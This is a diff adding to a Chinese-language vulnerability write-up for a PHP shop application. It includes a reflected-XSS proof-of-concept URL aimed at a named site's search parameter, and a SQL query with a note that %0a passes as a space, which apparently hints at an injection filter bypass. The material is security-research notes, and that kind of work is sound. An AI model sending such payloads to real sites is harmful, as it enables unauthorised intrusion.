@@ -22,5 +22,27 @@
   E:\PHPnow-1.5.6.1428396605\htdocs\eccore\model\mysql.php
   ```
 
+  # 反射型XSS
   
+  ```
+  http://www.cn-hee.cn/index.php?app=search&act=index&store_id=2&keyword="><script>alert(1)</script>//
+  ```
+
+![image-20220118102857294](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220118102857294.png)
+
+
+
+
+
+
+
+SQL语句为
+
+```sql
+SELECT *,cart.rec_id FROM ecm_cart cart WHERE session_id = 'd93634771d1675d2b726cebc851e2e0d' AND store_id=2
+```
+
+使用%0a成功执行为空格
+
+![image-20220118103248624](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220118103248624.png)
 
